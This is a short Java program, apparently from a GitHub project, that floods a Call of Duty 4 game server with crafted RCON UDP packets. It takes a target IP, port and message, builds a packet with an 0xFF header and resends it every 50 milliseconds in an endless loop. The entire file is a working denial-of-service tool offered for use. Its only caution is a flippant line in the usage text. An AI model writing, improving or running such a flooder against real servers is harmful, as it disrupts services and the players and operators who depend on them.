package com.zinglish.entry;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.UnknownHostException;

/**
 * Static implimentation of RCON flood
 * @author Zinglish
 */
public class Cod4ExploitRconflood
{
	public static void main(String[] args)
	{
		String targetIp     = "";
		int targetPort      = 28960;
		String message      = "cvarlist";
		
		DatagramSocket sock = null;
		DataOutputStream io = null;
		
		/* Get input from args */
		for(int i=0;i<args.length;i++)
		{
			if(args[i].equals("-s"))
				targetIp = args[i + 1];
			else if(args[i].equals("-p"))
				targetPort = Integer.parseInt(args[i + 1]);
			else if(args[i].equals("-m"))
				message = args[i + 1];
		}
		
		/* Check args and make sure we have everything we need */
		if(targetIp.equals(""))
		{
			System.out.print("Switches\n"
					+ "-s [ip]        IP Address to flood\n"
					+ "-p [port]      Port to flood, default to 28960\n"
					+ "-m [message]   The message to with, default to 'cvarlist'\n"
					+ "\nWith great power, comes great responsibility\n");
			System.exit(0);
		}
		
		/* Connect to the target!! */
		System.out.print("Attempting to connect to " + targetIp + ":" + targetPort + "\n");
		try
		{
			InetAddress addr = InetAddress.getByName(targetIp);
			sock = new DatagramSocket();
			
			sock.connect(addr, targetPort);
			
			System.out.print("Connection successful\n");
		}
		catch(UnknownHostException e)
		{
			System.out.print("Could not find host " + targetIp + "\n");
			System.exit(0);
		}
		catch(IOException e)
		{
			System.out.print("Could not set up socket correctly: " + e.getMessage() + "\n");
			System.exit(0);
		}
		
		/* Prebuild payload */
		String payload = "xxxx" + "rcon\rhttp://github/Zinglish/cod4-exploit-rconflood\r" + message + "\0";
		byte[] head = payload.getBytes();
		head[0] = (byte)0xFF;
		head[1] = (byte)0xFF;
		head[2] = (byte)0xFF;
		head[3] = (byte)0xFF;
		DatagramPacket packet = new DatagramPacket(head, head.length);
		
		/* Infinite loop to send the exploit packet every 50ms */
		while(true)
		{
			try
			{
				sock.send(packet);
			}
			catch(IOException e) {}
			
			try { Thread.sleep(50); }
			catch(InterruptedException e) {}
		}
	}
	
}
